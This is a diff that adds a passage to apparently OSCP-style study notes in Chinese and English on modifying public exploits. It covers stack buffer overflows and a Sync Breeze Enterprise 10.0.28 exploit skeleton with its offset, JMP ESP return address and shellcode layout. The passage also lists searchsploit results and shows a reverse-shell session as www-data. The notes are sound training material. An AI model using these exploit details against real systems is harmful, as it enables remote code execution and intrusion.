@@ -2535,4 +2535,107 @@ Connection from 192.168.215.11:43062
 id
 uid=33(www-data) gid=33(www-data) groups=33(www-data) 
 ```
+## Fixing Exploits
+Writing an exploit: difficult and time-consuming\
+✅ modify a public exploit to suit our specific needs.
+ˉ
 
+### Fixing Memory Corruption Exploits
+Memory corruption exploits (such as buffer overflows) 相對複雜且難以修改
+>[!Important]
+> **Buffer Overflow**:\
+> 只要使用者提供的內容超出堆疊限制並溢位到相鄰的記憶體區域\
+> ![image](https://hackmd.io/_uploads/Bk-oRTQUkl.png)
+> Memory corruption vulnerabilities 可能發生在程式的不同部分，例如 heap 或stack。heap 是動態管理的，通常儲存全域可存取的大型資料，而 stack 則用來儲存函式的區域資料，且其大小通常是固定的。
+> 1. 建立大緩衝區觸發溢位
+    Create a large buffer to trigger the overflow.
+> 2. 覆蓋返回位址並控制 EIP
+    Take control of EIP by overwriting a return address on the stack, padding the large buffer with an appropriate offset.
+> 3. 在緩衝區中包含有效負載，加入 NOP Sled
+    Include a chosen payload in the buffer prepended by an optional NOP5 sled.
+> 4. 選擇正確的返回位址
+    Choose a correct return address instruction such as JMP ESP (or a different register) to redirect the execution flow to the payload.
+
+Buffer of 64 characters has been declared and a user command line argument is copied into it via the strcpy2 function
+```c
+*buffer[64]*
+...
+strcpy(buffer, argv[1]);
+```
+以上範例不會檢查目標位址是否有足夠的空間來容納原始字串，可能會導致意外的應用程式行為。\
+**若使用者的輸入大於目標緩衝區的空間，則可能會覆寫返回位址。(overflow)**
+![image](https://hackmd.io/_uploads/r1DPzRX81l.png)
+> - **Before StrCpy**:\
+> Buffer 已初始化，並在記憶體中保留其空間。紅字顯示，返回位址保存了正確的記憶體位址
+> - **Copy with 32 A's**:\
+> user 輸入 32 characters 的 Ａ， 填滿了 Buffer 的一半。
+> - **Copy with 80 A's**:\
+> user 輸入 80 characters 的 Ａ， 填滿了整個 64 位元長的緩衝區，覆蓋了return address。
+
+As the letter "A" in hexadecimal converts to "41", the return address would be overwritten with a value of `\x41\x41\x41\x41`\
+Attacket 會使用 shellcode 的有效映射記憶體位址重寫回傳位址，使攻擊者能夠完全控制目標電腦
+
+>[!Warning]
+> A typical buffer overflow attack scenario involves `overwriting the return address with a JMP ESP instruction`, which instructs the program to jump to the stack and execute the shellcode that has been injected right after the beginning of the payload.
+
+Bad characters are `ASCII` or `UNICODE` characters that break the application when included in the payload because they might be interpreted as control characters.\
+Ex. null-byte "\x00" is often interpreted as a string terminator
+
+以下針對 Sync Breeze Enterprise 10.0.28 並專注於兩個可用漏洞\
+```
+┌──(chw㉿CHW-kali)-[~]
+└─$ searchsploit "Sync Breeze Enterprise 10.0.28"
+--------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                       |  Path
+--------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Sync Breeze Enterprise 10.0.28 - Denial of-Service (PoC)                                                             | windows/dos/43200.py
+Sync Breeze Enterprise 10.0.28 - Remote Buffer Overflow                                                              | windows/remote/42928.py
+Sync Breeze Enterprise 10.0.28 - Remote Buffer Overflow (PoC)                                                        | windows/dos/42341.c
+--------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+> 三個 exploit，為避免 simple application crash，若有更好的選擇先不使用 Dos exploit\
+
+>[!Note]
+>The vulnerability is present in the **HTTP server module** where a buffer overflow condition is triggered on a `POST request`.
+
+```
+offset    = "A" * 780 
+JMP_ESP   =  "\x83\x0c\x09\x10"
+shellcode = "\x90"*16 + msf_shellcode
+exploit   = offset + JMP_ESP + shellcode
+```
+在偏移量 780 處，我們使用位於記憶體位址 `0x10090c83` 的JMP ESP (Jump to Extended Stack Pointer)指令覆寫指令指標
+
+>[!Important]
+>The first key difference is that scripting languages are executed through an interpreter and not compiled to create a stand-alone executable.\
+>如果使用 python 腳本，會需要依賴目標環境是否有安裝 python 
+>> 或考慮使用 PyInstaller ，將 Python 應用程式打包成適用於各種目標作業系統的獨立執行檔
+>
+> python 優點：串接字串非常容易 `string3 = string1 + string2`
+
+以下使用 C exploit 舉例:
+```
+┌──(chw㉿CHW-kali)-[~]
+└─$ searchsploit -m 42341
+  Exploit: Sync Breeze Enterprise 10.0.28 - Remote Buffer Overflow (PoC)
+...
+Copied to: /home/chw/42341.c
+
+┌──(chw㉿CHW-kali)-[~]
+└─$ cat 42341.c 
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
+#define DEFAULT_BUFLEN 512
+
+#include <inttypes.h>
+#include <stdio.h>
+#include <winsock2.h>
+#include <windows.h>
+...
+```
+> 根據 include winsock2.h 可以猜測應該需要在 Windows 上編譯
+
+為了避免編譯問題，通常建議針對程式碼所針對的特定作業系統使用本機編譯器；但若只能存取單一環境，需要利用針對不同平台編碼的漏洞。在這種情況下，交叉編譯器會非常有幫助。
+
+
+###  Cross-Compiling Exploit Code 交叉編譯漏洞
